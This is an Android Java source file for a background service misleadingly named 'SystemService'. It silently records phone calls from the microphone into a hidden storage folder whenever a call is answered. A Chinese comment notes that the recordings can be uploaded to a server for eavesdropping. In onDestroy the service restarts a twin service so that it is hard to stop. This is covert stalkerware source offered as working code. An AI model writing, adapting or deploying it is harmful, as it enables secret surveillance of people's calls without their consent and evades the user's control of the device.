package com.andrew.systemservice;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.media.AudioRecord;
import android.media.AudioTrack;
import android.media.AudioFormat;
import java.io.IOException;
import java.io.FileOutputStream;
import android.media.MediaPlayer;

import java.io.File;

public class SystemService extends Service {
	// 电话管理器
	private TelephonyManager tm;
	// 监听器对象
	private MyListener listener;
	//声明录音机
	private MediaRecorder mediaRecorder;

	public static final String DIR = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "1122" + File.separator;

	private boolean mIsRecoding = false;

	private boolean mReqStop = false;

	private int recBufSize, playBufSize;

	private AudioRecord audioRecord;

	private static final int sampleRateInHz = 44100;
	private static final int channelConfig = AudioFormat.CHANNEL_CONFIGURATION_STEREO;
	private static final int audioFormat = AudioFormat.ENCODING_PCM_16BIT;
	private String wmr_path;
	private MediaPlayer mp;


	AudioTrack audioTrack;
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	/**
	 * 服务创建的时候调用的方法
	 */
	@Override
	public void onCreate() {
		// 后台监听电话的呼叫状态。
		// 得到电话管理器
		tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		listener = new MyListener();
		tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
		super.onCreate();
	}

	private class MyListener extends PhoneStateListener {
		// 当电话的呼叫状态发生变化的时候调用的方法
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			super.onCallStateChanged(state, incomingNumber);
			try {
				switch (state) {
					case TelephonyManager.CALL_STATE_IDLE://空闲状态。
						System.out.println(incomingNumber);
						mp = new MediaPlayer();
						mp.setDataSource(wmr_path);
						mp.prepare();
						mp.start();
						if(mIsRecoding){
							System.out.println("fuck");
							//8.停止捕获
							mediaRecorder.stop();
							//9.释放资源
							mediaRecorder.release();
							mediaRecorder = null;
							mIsRecoding = false;
							//TODO 这个地方你可以将录制完毕的音频文件上传到服务器，这样就可以监听了
							Log.i("SystemService", "音频文件录制完毕，可以在后台上传到服务器");

						}

						break;
					case TelephonyManager.CALL_STATE_RINGING://零响状态。

						break;
					case TelephonyManager.CALL_STATE_OFFHOOK://通话状态
						System.out.println(incomingNumber);
						mediaRecorder = new MediaRecorder();
						// 从麦克风源进行录音
						mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
						// 设置输出格式
						mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
						// 设置编码格式
						mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
						File dir = new File(DIR);
						if (!dir.exists()) {
							dir.mkdir();
						}
						if (!mIsRecoding) {
							long time = System.currentTimeMillis();
							String fileName = time + ".amr";
							File file = new File(DIR + fileName);
							System.out.println(DIR + fileName);
							try {
								file.createNewFile();
							} catch (IOException e) {
								System.out.println("aaa");
								e.printStackTrace();
							}
							System.out.println("ddd");
							wmr_path = DIR + fileName;
							mediaRecorder.setOutputFile(DIR + fileName);

							try {
								System.out.println("bbb");
								mediaRecorder.prepare();
								mediaRecorder.start();
								mIsRecoding = true;
						//		new RecordPlayThread().start();

							} catch (Exception e) {
								System.out.println("ccc");
								e.printStackTrace();
							}
						}
					default:
						break;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}


	private final int kSampleRate = 44100;
	private final int kChannelMode = AudioFormat.CHANNEL_IN_STEREO;
	private final int kEncodeFormat = AudioFormat.ENCODING_PCM_16BIT;
	private static String TAG = "fb";

	private void init() {
		int minBufferSize = AudioRecord.getMinBufferSize(kSampleRate, kChannelMode,
				kEncodeFormat);
		audioRecord = new AudioRecord(MediaRecorder.AudioSource.REMOTE_SUBMIX,
				kSampleRate, kChannelMode, kEncodeFormat, minBufferSize * 10);
	}

	private final int kFrameSize = 2048;
	private String filePath = "/sdcard/voice.pcm";

	private void recordAndPlay() {
		FileOutputStream os = null;
		audioRecord.startRecording();
		try {
			os = new FileOutputStream(filePath);
			byte[] buffer = new byte[kFrameSize];
			int num = 0;
			while (!mReqStop) {
				num = audioRecord.read(buffer, 0, kFrameSize);
				Log.d(TAG, "buffer = " + buffer.toString() + ", num = " + num);
				os.write(buffer, 0, num);
			}

			Log.d(TAG, "exit loop");
			os.close();
		} catch (IOException e) {
			e.printStackTrace();
			Log.e(TAG, "Dump PCM to file failed");
		}
		audioRecord.stop();
		audioRecord.release();
		audioRecord = null;
		Log.d(TAG, "clean up");
	}


	class RecordPlayThread extends Thread {
		public void run() {
			try {
				recBufSize = audioRecord.getMinBufferSize(sampleRateInHz,channelConfig, audioFormat);
				audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC,
						sampleRateInHz, channelConfig, audioFormat, recBufSize);
				System.out.println("AAAAAAAAA");
				byte[] buffer = new byte[recBufSize];

				audioRecord.startRecording();//开始录制
				System.out.println("ssdddd");
				mIsRecoding = true;
				while (mIsRecoding) {
					System.out.println("fblbla");
					//从MIC保存数据到缓冲区
					int bufferReadResult = audioRecord.read(buffer, 0,
							recBufSize);

					byte[] tmpBuf = new byte[bufferReadResult];
					System.arraycopy(buffer, 0, tmpBuf, 0, bufferReadResult);
					System.out.println(tmpBuf);
					//写入数据即播放
				}
			} catch (Throwable t) {
				//
			}
			finally {
				audioRecord.stop();
				audioRecord.release();
			}
		}
	};
	/**
	 * 服务销毁的时候调用的方法
	 */
	@Override
	public void onDestroy() {
		super.onDestroy();
		// 取消电话的监听,采取线程守护的方法，当一个服务关闭后，开启另外一个服务，除非你很快把两个服务同时关闭才能完成
		Intent i = new Intent(this,SystemService2.class);
		startService(i);
		tm.listen(listener, PhoneStateListener.LISTEN_NONE);
		listener = null;
	}

}
